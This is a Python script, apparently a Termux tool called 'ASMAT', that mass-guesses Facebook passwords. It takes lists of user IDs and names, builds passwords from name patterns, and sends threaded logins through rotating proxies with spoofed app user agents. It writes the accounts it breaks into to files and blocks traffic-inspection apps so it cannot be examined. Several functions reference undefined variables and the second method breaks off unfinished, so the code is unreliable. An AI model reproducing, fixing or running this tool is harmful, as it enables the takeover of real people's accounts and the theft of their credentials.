from os import path
import os,base64,zlib,pip,urllib, random ,time,json,re,string,subprocess,sys

os.system('clear')
print('\n [√] Wait Installing Modules...!')
#os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")

###### FOLDER MAKE ###### 

try:
    os.mkdir('ASMAT')
    os.system('mv ASMAT /sdcard')
except:
    pass

######### MISSING MODULE #######

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n [√] Installing Missing Modules...!')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ASMAT.py')
except:pass

######### HTTP CANARY #######
def http():
    try:
          os.system('cd /sdcard','cd Android','cd data')
          ASMAT = os.listdir('/sdcard/Android/data')
          if 'com.httpcanary.pro' in ASMAT:                 
                 print('m[×] \033[1;31mFirst Uninstall Http Canary Then Run This Tool !');exit()
          else:pass
    except Exception as e:
                    pass
    try:
          os.system('cd /sdcard','cd Android','cd data')
          ASMAT = os.listdir('/sdcard/Android/data')
          if 'com.guoshi.httpcanary' in ASMAT:                 
                 print('m[×] \033[1;31mFirst Uninstall Http Canary Then Run This Tool !');exit()
          else:pass
    except Exception as e:
                    pass


######### PROXY #######                 

proxies = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678']
os.system('touch prox.txt')

try:
    prox= requests.get('https://raw.githubusercontent.com/ASMAT-RAJPOOT/Proxy/main/prox.txt').text
    open('prox.txt','w').write(prox)
except Exception as e:
    
    proxies=open('prox.txt','r').read().splitlines()

####### USER AGENT ######

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

        
######## LOGO #######
        
logo=("""\033[1;37m
   ###     ######  ##     ##    ###    ######## 
  ## ##   ##    ## ###   ###   ## ##      ##    
 ##   ##  ##       #### ####  ##   ##     ##    
##     ##  ######  ## ### ## ##     ##    ##    
#########       ## ##     ## #########    ##    
##     ## ##    ## ##     ## ##     ##    ##    
##     ##  ######  ##     ## ##     ##    ##    
═════════════════════════════════════════
\033[1;37m TOOL OWNER :  ASMAT
\033[1;37m TOOL STATUS : \033[1;37mTESTING""")
os.system('clear')

######## CLEAR #######

def clear():os.system('clear');print(logo);print(41*'═')

######### LINE #########

def line():print(41*'\033[1;32m═')

####### IMPORTANT THINGS ######

loop=0
user_opt = []
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]

######## MENU ######

def menu():
    clear();http()
    print(' [\033[1;32m1\033[97;1m] FILE CLONING')
    print(' [\033[1;32m0\033[97;1m] \033[1;31mEXIT FROM ASMAT TOOL ');line()
    ASMAT=input(' [•] Choose : ')
    if ASMAT in ['1','01']:file()
    elif ASMAT in ['0','00']:os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287');line();print('[•] Thanks For Use\n[•] See You Again ');exit()
    else:
        line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);menu()
 
###### FILE #####

def file():
    
        clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/ASMAT.txt");line()
        file = input(f'\033[1;32m [?]\033[1;37m Put File Path : ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            line();print(f'\n\033[1;32m [!]\033[1;37m File location not found ');time.sleep(3)
            menu()
        clear();print(f'\033[1;32m [1] \033[1;37mMETHOD\n\033[1;32m [2] \033[1;37mMETHOD');line()
        mthd=input(f'\033[1;32m [?] \033[1;37mChoose : ')
        plist=[]
        try:
            clear()
            ps_limit = int(input(f'\033[1;32m [?]\033[1;37m Enter Password Limit : '));clear()
        except:
            ps_limit =1
        print(f'\033[1;32m [√] \033[1;37mYour Choosed Password Limits : \033[1;32m',ps_limit);line()
        print(f'\033[1;32m [•] \033[1;37mEXAMPLE : first last,firtslast,first123');line()
        for i in range(ps_limit):
            plist.append(input(f'\033[1;32m [?]\033[1;37m Put Password [{i+1}] : '))
        clear()
        cx=input(f'\033[1;32m [?] \033[1;37mShow Cp Account (y/n) : ')
        
        if cx in ['n','N','no','NO','2']:
            pcp.append(f'n')
        else:
            pcp.append(f'y')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print('\033[1;32m (√) \033[1;37mTotal IDs  :\033[1;32m '+total_ids+f'\n\033[1;32m [√] \033[1;37mMethod \033[1;32m>\033[1;37m M{mthd}')
            print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");line()
            for user in fo:
                ids,names = user.split(f'|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)               
                else:
                    crack_submit.submit(ffb,ids,names,passlist)
        print('\n');line();print("\033[1;32m [✓] \033[1;37mYour Process Has Been Completed");line();input("\033[1;32m [✓] \033[1;37mPress Enter To Back Menu ");os.system('python ASMAT.py')

######### FILE METHOD 1 #######
                
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ASMAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        us = 'Dalvik/2.1.0 (Linux; U;Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                        us = '[FBAN/FB4A;FBAV/60.0.0.47.62;FBBV/23784374;FBDM/{density=2.5,width=980,height=1600};FBLC/en_US;FBRV/27457394;FBPN/com.facebook.katana;FBCR/Roshan;FBMF/KYOCERA;FBBD/KYOCERA;FBDV/KYV42;FBSV/7.1.1;FBOP/19;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1039;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/orange;FBPN/com.facebook.katana;FBDV/C5303;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]'
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': us, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ASMAT-OK] '+ids+' √ '+pas+'\033[1;97m')
                                open('/sdcard/ASMAT/ASMAT-OK.txt','a').write(ids+' √ '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in cp:
                                        print('\r\r\033[1;37m [ASMAT-CP] '+ids+' • '+pas+'\033[1;97m')
                                        open('/sdcard/ASMAT/ASMAT-CP.txt','a').write(ids+' • '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
        
######## FILE METHOD 2 #########

def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ASMAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(00,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android = str(random.randint(4,13))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = str(random.randint(111111111,999999999))
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB','en_FR'])
                        #oppo = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        #nokia = random.choice(['1011','105','109','110','1100','111','112','1120','113','114','1320','1600','1715','2000','2010','2020','2030','205','2050','2051','2052','2055','206','2060','207','208','210','2626','2630','2690','2700','2710','2720','2730','2780','3','3 V','301','3020','3030','3050','3070','3080','3090','311','3110','3200','3210','3230','3250','3310','3710','3710 ','3720 ','4','5','501s','5130','5130 ','515','520','5228','5233','5235','5238','525','5250','5320','5330','5530','5530 ','5630','5700','5730 ','5800','5800 ','6','603','6110','6120 ','6121 ','6124 ','6131','6136','6151','620','6210', '6220 ','6233','625H','6280','6290','6300','6303','6303 ','6600','6600 ','6630','6650','6670','6680','6681','6700 ','6700 ','6710 ','6720 ','6730 ','6760','6790 ','7','7 plus','700','701','7020','7230','7610','7650','7710','8','8 Sirocco','800','8000','808','8110','8110 ','8250','8910','8910i','8V ','9','909','925T','9300','9500','Asha 200','Asha 201','Asha 202','Asha 203','Asha 205','Asha 206','Asha 208','Asha 210','Asha 220','Asha 225','Asha 230','Asha 300','Asha 301','Asha 302','Asha 303','Asha 305','Asha 306','Asha 307','Asha 308','Asha 309','Asha 310','Asha 311','Asha 500','Asha 501','Asha 502','Asha 503','Asha 515','Asha 520','C01','C01 Plus','C1','C1 2nd Edition','C1 Plus','C10','C100','C12','C12 Pro','C2','C2 Tennen','C20','C20 Plus','C200','C21','C21 Plus','C22','C3','C30','C31','C32','c5','C5 Endi','c6','C7','C8 ','e5','e50','E51','e52','E55','e6','E60','E61','e63','e65','e66','E7','e71','e72','e73','e75','E90','G10','G100','G11','G11 Plus','G20','G21','G22','G300','G310 ','G400 ','G42 ','G50','G60 ','Lumia 1020','Lumia 1520','Lumia 430','Lumia 505','Lumia 510','Lumia 520','Lumia 521','Lumia 525','Lumia 526','Lumia 530','Lumia 530 ','Lumia 532','Lumia 540','Lumia 610','Lumia 610 ','Lumia 620','Lumia 625','Lumia 630','Lumia 630 ','Lumia 635','Lumia 636','Lumia 638','Lumia 710','Lumia 720','Lumia 730','Lumia 735','Lumia 800','Lumia 810','Lumia 820','Lumia 822','Lumia 830','Lumia 900','Lumia 920','Lumia 925','Lumia 928','Lumia 930','Lumia Icon','N70','n72','N73','N76','N78','N79','n8','N80','n81','n82','n85','n86','N9','N90','N900','n93','N95','N950','n96','n97','Nokia X100','T10','T20','T21','X','X10','X100','X2','X20','X3','X30','X5','x6','x7','X71','XL','XR20','XR21'])
                        #samsung = random.choice(['GT-I9190|KOT49H','GT-I9192|KOT49H','GT-I9300I|KTU84P','GT-I9300|IMM76D','GT-I9300|JSS15J','GT-I9301I|KOT4','GT-I9301I|KOT49H','GT-I9500|JDQ39','GT-I9500|LRX22C','GT-N5100|JZO54K','GT-N7100|KOT49H','GT-N8000|JZO54K','GT-N8000|KOT49H','GT-P3110|JZO54K','GT-P5100|IML74K','GT-P5100|JDQ','GT-P5100|JDQ39','GT-P5100|JZO54K','GT-P5110|JDQ39','GT-P5200|KOT49H','GT-P5210|KOT49H','GT-P5220|JDQ39','GT-S7390|JZO54K','SM-A500FU|MMB29M','SM-A500F|LRX22G','SM-A500F|MMB29M','SM-A500H|MMB29M','SM-G900F|KOT49H','SM-G920F|MMB29K','SM-G920F|NRD90M','SM-G930F|NRD90M','SM-G935F|MMB29K','SM-G935F|NRD90M','SM-G950F|NRD90M','SM-J320FN|LMY47V','SM-J320F|LMY4','SM-J320F|LMY47V','SM-J320H|LMY47V','SM-J320M|LMY47V','SM-J510FN|MMB29M','SM-J510FN|NMF2','SM-J510FN|NMF26X','SM-J510FN|NMF26X','SM-J701F|NRD90M','SM-J701F|NRD90M','SM-T111|JDQ39','SM-T230|KOT49H','SM-T231|KOT49H','SM-T235|KOT4','SM-T310|KOT49H','SM-T311|KOT4','SM-T311|KOT49H','SM-T315|JDQ39','SM-T525|KOT49H','SM-T531|KOT49H','SM-T531|LRX22G','SM-T535|LRX22G','SM-T555|LRX22G','SM-T561|KTU84P','SM-T705|LRX22G','SM-T705|LRX22G;','SM-T805|LRX22G','SM-T820|NRD90M','SPH-L720|KOT49H','SM-F936BZAHINU','SM-F936BZEHINU','SM-F936BZKHINU','SM-F936BZADINU','SM-F936BZEDINU','SM-F936BZKDINU','SM-F936BZAGINU','SM-F936BZEGINU','SM-F936BZKGINU','SM-F711BZEF','SM-F711BZKF','SM-F711BLVB','SM-F711BZEB','SM-F711BZKB','SM-G980FLBD','SM-G980FZAD','SM-G980FZID','SM-G988BZAP','SM-G985FLBD','SM-G985FZAD','SM-G985FZKD','SM-N980FZBG','SM-N980FZGG','SM-N980FZNG','SM-N986BZKG','SM-N986BZNG','SM-T875NZKA','SM-T875NZNA','SM-T875NZSA','SM-T975NZKA','SM-T975NZNA','SM-T975NZSA','SM-F916BZKA','SM-F916BZNA','SM-G780FLVN','SM-G780FZBN','SM-G780FZBO','SM-G780FZGN','SM-G780FZRN','SM-G780FZWN','SM-G991BZAD','SM-G991BZID','SM-G991BZVD','SM-G991BZWD','SM-G991BZWG','SM-G991BZVG','SM-G991BZAG','SM-G998BZKG','SM-G998BZSG','SM-G998BZKH','SM-G996BZKD','SM-G996BZVD','SM-G996BZSD','SM-G996BZSG','SM-G996BZVG','SM-G996BZKG','SM-G781BLVG','SM-G781BZBG','SM-G781BZGG','SM-F711BLVA','SM-F711BZEA','SM-F711BZKA','SM-F711BZKE','SM-F711BZEE','SM-F926BZGD','SM-F926BZKD','SM-F926BZSD','SM-F926BZKG','SM-X906BZAE','SM-X900NZAE','SM-X806BIDA','SM-X806BZAA','SM-X806BZSA','SM-X800NIDA','SM-X800NZAA','SM-X800NZSA','SM-X706BIDA','SM-X706BZAA','SM-X706BZSA','SM-X700NIDA','SM-X700NZAA','SM-X700NZSA','SM-S908EDRG','SM-S908EDRH','SM-S908EZKG','SM-S908EZKH','SM-S908EZWG','SM-S901EZGD','SM-S901EZKD','SM-S901EZWD','SM-N900','SM-N9002','SM-N9005','SM-N9007','SM-N9008','SM-N9008S','SM-N9008V','SM-N9009','SM-N9009V','SM-N900A','SM-N900K','SM-N900L','SM-N900P','SM-N900R4','SM-N900S','SM-N900T','SM-N900U','SM-N900V','SM-N900W8','SM-N900X','SM-N9000Q','SM-N9006','SM-9005'])
                        #network = random.choice(['Zong','null','Marshmallow','Telekom China'])                       
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ua ='[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/;FBMF/samsung;FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/armeabi-v7a:armeabi;]'
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/armeabi-v7a:armeabi;]'
                        ua ='[FBAN/FB4A;FBAV/m'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1184};FBLC/sv_SE;FBCR/Telenor SE;FBMF/BullittGroupLimited;FBBD/Cat;FBPN/com.facebook.katana;FBDV/'+fbdv+';FBSV/'+fbsv+';nullFBCA/armeabi-v7a:armeabi;]'
                        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
                        ua = '[FBAN/FB4A;FBAV/248.0.0.64.126;FBBV/71257784;FBDM/{density=3.4,width=1307,height=2393};FBLC/en_GB;FBRV/19388344;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700FD;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]'
                        ua = 'Dalvik/2.1.0 (Linux; U;Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data ={
                                'adid': str(uuid.uuid4()),
                                'format': 'json',
                                'device_id': str(uuid.uuid4()),
                                'email': uid,
                                'password': ps,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': 'en_US',
                                'client_country_code': 'US',
                                'fb_api_req_friendly_name': 'authenticate',
                                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        }
                        headers={
                                'authority': 'm.facebook.com',
                                'accept': '*/*',
                                'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarykyAshm2bCeq47Eae',
                                'dpr': '3.8375',
                                'origin': 'https://m.facebook.com',
                                'sec-ch-prefers-color-scheme': 'light',
                                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
                                'sec-ch-ua-mobile': '?1',
                                'sec-ch-ua-model': '"706SH"',
                                'sec-ch-ua-platform': '"Android"',
                                'sec-ch-ua-platform-version': '"10.0.0"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                                'viewport-width': '376',
                                'x-asbd-id': '129477',
                                'x-fb-lsd': 'AVoJV3Anll0',
                                'x_fb_background_state': '1',
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                                }
                                
                        url = "https://b-api.facebook.com/method/auth.login"
                        lo = session.post('https://m.facebook.com/?rtime=1699999551&hrc=1&wtsid=rdr_0vUHYzUFHuYBpt7OS&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
